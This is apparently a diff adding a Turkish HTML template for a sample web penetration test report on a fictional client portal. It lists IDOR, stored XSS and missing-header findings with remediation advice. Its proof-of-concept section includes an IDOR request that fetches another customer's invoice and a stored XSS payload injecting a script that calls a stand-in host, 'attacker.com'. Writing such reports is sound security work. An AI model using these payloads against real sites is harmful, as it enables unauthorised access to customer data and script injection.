@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sızma Testi Raporu - Örnek Şablon</title>
+    <style>
+        :root {
+            --primary: #1e293b;
+            --secondary: #475569;
+            --bg-light: #f8fafc;
+            --border: #e2e8f0;
+            --critical: #dc2626;
+            --high: #ea580c;
+            --medium: #ca8a04;
+            --low: #2563eb;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #334155;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f1f5f9;
+        }
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            background: #ffffff;
+            padding: 40px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        header {
+            border-bottom: 2px solid var(--primary);
+            padding-bottom: 20px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+        header h1 {
+            margin: 0;
+            color: var(--primary);
+            font-size: 28px;
+        }
+        .badge-confidential {
+            background-color: var(--critical);
+            color: white;
+            padding: 4px 10px;
+            font-size: 12px;
+            font-weight: bold;
+            border-radius: 4px;
+            text-transform: uppercase;
+        }
+        h2 {
+            color: var(--primary);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 8px;
+            margin-top: 35px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        th, td {
+            border: 1px solid var(--border);
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background-color: var(--bg-light);
+            color: var(--primary);
+            font-weight: 600;
+        }
+        .severity {
+            padding: 4px 8px;
+            border-radius: 4px;
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+            display: inline-block;
+        }
+        .sev-critical { background-color: var(--critical); }
+        .sev-high { background-color: var(--high); }
+        .sev-medium { background-color: var(--medium); }
+        .sev-low { background-color: var(--low); }
+        .finding-card {
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 25px;
+            background-color: #ffffff;
+        }
+        .finding-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
+        }
+        .finding-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: var(--primary);
+            margin: 0;
+        }
+        pre {
+            background-color: #1e293b;
+            color: #f8fafc;
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+            font-size: 13px;
+        }
+        @media print {
+            body { background-color: #fff; }
+            .container { box-shadow: none; margin: 0; padding: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <div>
+            <span class="badge-confidential">GİZLİ / HİZMETE ÖZEL</span>
+            <h1>Web Uygulaması Sızma Testi Raporu</h1>
+            <p style="margin: 5px 0 0; color: var(--secondary);">Müşteri: <strong>Örnek Teknoloji A.Ş.</strong></p>
+        </div>
+        <div style="text-align: right; font-size: 14px;">
+            <p style="margin: 2px 0;"><strong>Rapor Tarihi:</strong> 13 Kasım 2026</p>
+            <p style="margin: 2px 0;"><strong>Sürüm:</strong> v1.0</p>
+            <p style="margin: 2px 0;"><strong>Hazırlayan:</strong> Siber Güvenlik Ekibi</p>
+        </div>
+    </header>
+
+    <h2>1. Yönetici Özeti</h2>
+    <p>
+        Bu rapor, <strong>Örnek Teknoloji A.Ş.</strong> bünyesinde yer alan müşteri portalı web uygulaması üzerinde gerçekleştirilen siyah kutu (black-box) ve gri kutu (grey-box) sızma testi çalışmalarının sonuçlarını içermektedir. Testler 02 Kasım 2026 – 06 Kasım 2026 tarihleri arasında yürütülmüştür.
+    </p>
+    <p>
+        Yapılan incelemeler sonucunda sistemin genel güvenlik duruşu <strong>Orta-Yüksek Riskli</strong> olarak değerlendirilmiştir. Yetkisiz veri erişimine yol açabilecek kritik bir yetkilendirme zafiyeti tespit edilmiş olup acil olarak giderilmesi önerilmektedir.
+    </p>
+
+    <h2>2. Kapsam ve Metodoloji</h2>
+    <table>
+        <tr>
+            <th>Hedef Sistem / URL</th>
+            <th>Test Türü</th>
+            <th>Durum</th>
+        </tr>
+        <tr>
+            <td>https://ornekteknoloji.com</td>
+            <td>Web Uygulaması (OWASP Top 10)</td>
+            <td>Tamamlandı</td>
+        </tr>
+        <tr>
+            <td>https://ornekteknoloji.com</td>
+            <td>REST API Güvenlik Testi</td>
+            <td>Tamamlandı</td>
+        </tr>
+    </table>
+
+    <h2>3. Bulguların Özeti</h2>
+    <table>
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>Bulgu Başlığı</th>
+                <th>Risk Seviyesi</th>
+                <th>CVSS v3.1</th>
+                <th>Durum</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>F-01</td>
+                <td>IDOR (Güvensiz Doğrudan Nesne Referansı) ile Müşteri Verilerine Erişim</td>
+                <td><span class="severity sev-critical">Kritik</span></td>
+                <td>9.1</td>
+                <td>Açık</td>
+            </tr>
+            <tr>
+                <td>F-02</td>
+                <td>Profil Güncelleme Alanında Saklı XSS (Stored XSS)</td>
+                <td><span class="severity sev-high">Yüksek</span></td>
+                <td>7.4</td>
+                <td>Açık</td>
+            </tr>
+            <tr>
+                <td>F-03</td>
+                <td>Eksik Güvenlik Başlıkları (CSP ve HSTS)</td>
+                <td><span class="severity sev-low">Düşük</span></td>
+                <td>3.1</td>
+                <td>Açık</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h2>4. Teknik Bulgular ve Çözüm Önerileri</h2>
+
+    <div class="finding-card">
+        <div class="finding-header">
+            <h3 class="finding-title">[F-01] IDOR ile Yetkisiz Müşteri Faturası Görüntüleme</h3>
+            <span class="severity sev-critical">Kritik (CVSS: 9.1)</span>
+        </div>
+        <p><strong>Etkilenen Bileşen:</strong> <code>GET /api/v1/invoices/{invoice_id}</code></p>
+        <p><strong>Açıklama:</strong> Fatura görüntüleme uç noktasında (endpoint), oturum açmış kullanıcının talep edilen fatura numarasına erişim yetkisi olup olmadığı sunucu tarafında doğrulanmamaktadır. Sıralı fatura numaraları değiştirilerek diğer müşterilere ait fatura bilgilerine erişilebilmektedir.</p>
+
+        <p><strong>Kanıt (Proof of Concept):</strong></p>
+        <pre>GET /api/v1/invoices/10482 HTTP/1.1
+Host: ://ornekteknoloji.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+
+HTTP/1.1 200 OK
+{"invoice_id": 10482, "customer": "Farklı Müşteri Ltd.", "amount": "14.500 TL"}</pre>
+
+        <p><strong>Çözüm Önerisi:</strong> Sunucu tarafında her istek için oturum açan kullanıcının kimliği (user_id) ile talep edilen kaynağın sahibi eşleştirilmelidir. Tahmin edilebilir artan ID'ler yerine UUID v4 kullanılması önerilir.</p>
+    </div>
+
+    <div class="finding-card">
+        <div class="finding-header">
+            <h3 class="finding-title">[F-02] Profil Ayarlarında Saklı XSS (Stored XSS)</h3>
+            <span class="severity sev-high">Yüksek (CVSS: 7.4)</span>
+        </div>
+        <p><strong>Etkilenen Bileşen:</strong> <code>POST /profile/update</code> (Ad Soyad alanı)</p>
+        <p><strong>Açıklama:</strong> Kullanıcı profilindeki "Ad Soyad" alanına girilen zararlı JavaScript kodları filtrelenmeden veritabanına kaydedilmekte ve yönetici panelinde bu kullanıcı görüntülendiğinde tarayıcıda çalışmaktadır.</p>
+
+        <p><strong>Kanıt (Proof of Concept):</strong></p>
+        <pre>full_name=Ahmet+Yılmaz"&gt;&lt;script&gt;fetch('https://attacker.com)&lt;/script&gt;</pre>
+
+        <p><strong>Çözüm Önerisi:</strong> Kullanıcıdan alınan tüm girdiler HTML çıktısına basılmadan önce bağlama uygun şekilde kodlanmalı (HTML Entity Encoding) ve güçlü bir Content-Security-Policy (CSP) uygulanmalıdır.</p>
+    </div>
+
+</div>
+
+</body>
+</html>
